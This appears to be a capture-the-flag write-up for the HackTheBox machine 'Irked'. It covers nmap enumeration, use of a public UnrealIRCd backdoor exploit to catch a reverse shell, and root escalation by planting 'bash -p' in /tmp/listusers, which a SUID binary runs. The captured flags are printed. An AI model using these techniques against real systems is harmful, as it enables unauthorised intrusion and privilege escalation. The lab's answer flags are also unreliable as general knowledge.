# Irked
>Author : Xyan1d3
>Date : 6th July 2021
>IP : 10.10.10.117
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jul  6 15:49:48 2021 as: nmap -sC -sV -oN nmap/irked -v 10.10.10.117
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.061s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38819/udp   status
|   100024  1          41868/tcp   status
|   100024  1          41964/udp6  status
|_  100024  1          52347/tcp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nmap all ports without scripts
```sql
# Nmap 7.91 scan initiated Tue Jul  6 15:53:49 2021 as: nmap -p- -oN nmap/irked-all-ports -v 10.10.10.117
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.066s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
41868/tcp open  unknown
65534/tcp open  unknown
```

## Nmap all open ports with scripts
```sql
# Nmap 7.91 scan initiated Tue Jul  6 16:15:15 2021 as: nmap -p22,80,111,6697,8067,41868,65534 -A -oN nmap/deep-scan -v 10.10.10.117
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.062s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38819/udp   status
|   100024  1          41868/tcp   status
|   100024  1          41964/udp6  status
|_  100024  1          52347/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
41868/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   61.52 ms 10.10.14.1
2   61.88 ms irked.htb (10.10.10.117)
```

# Initial FootHold
We find out that the box is running `UnrealIRCd` which is vulnerable to an unauthenticated remote command injection.

Exploit : https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor

We need to modify line number 14 & 15 and chnage it to our attacker box ip and port to catch the shell.
![[Pasted image 20210706163031.png]]

We would now listen on the port and run the exploit.
![[Pasted image 20210706163330.png]]

We recieve a shell on the box as the `ircd` user.

# Root Escalation
For, Root Escalation we need to check all the suid binaries of the box.
```python
ircd@irked:~$ find / -perm /4000 2> /dev/null

*** SNIP ***

/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser    <---- The intersting binary
/sbin/mount.nfs

*** SNIP ***
```

We transfer this binary onto our box and run a ltrace against.
```
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/irked]
└──╼ # ltrace ./viewuser 
__libc_start_main(0x5661057d, 1, 0xff8ba744, 0x56610600 <unfinished ...>
puts("This application is being devleo"...This application is being devleoped to set and test user permissions
)                                                             = 69
puts("It is still being actively devel"...It is still being actively developed
)                                                             = 37
system("who"root     tty7         2021-07-06 11:08 (:0)
root     pts/1        2021-07-06 11:09 (X)
root     pts/2        2021-07-06 11:10 (tmux(2274).%0)
root     pts/3        2021-07-06 16:38 (tmux(2274).%44)
root     pts/4        2021-07-06 16:42 (tmux(2274).%45)
root     pts/5        2021-07-06 16:23 (tmux(2274).%39)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) 		= 0
setuid(0)					= 0
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )		= 32512
+++ exited (status 0) +++
```

Here, We see that the binary is setting the uid to `0` as it has a `setuid` bit set.
Then, It is calling a file `/tmp/listusers` and throwing an error as it does not exists.

We could create a file in called `/tmp/listusers` and put a `bash -p` and set and execute bit on it. We could then call the binary to get bash spawned as `root`.
![[Pasted image 20210706165534.png]]

## Getting the User Flag
```python
root@irked:~# cd /home/djmardov/Documents/
root@irked:/home/djmardov/Documents# ls -l
total 4
-rw------- 1 djmardov djmardov 33 May 15  2018 user.txt
root@irked:/home/djmardov/Documents# cat user.txt 
4a66a78b12dc0e661a59d3f5c0267a8e
```

## Getting the Root Flag
```python
root@irked:~# cd /root/
root@irked:/root# ls -l
total 8
-rw-r--r-- 1 root root 17 May 14  2018 pass.txt
-rw------- 1 root root 33 May 15  2018 root.txt
root@irked:/root# cat root.txt 
8d8e9e8be64654b6dccc3bff4522daf3
```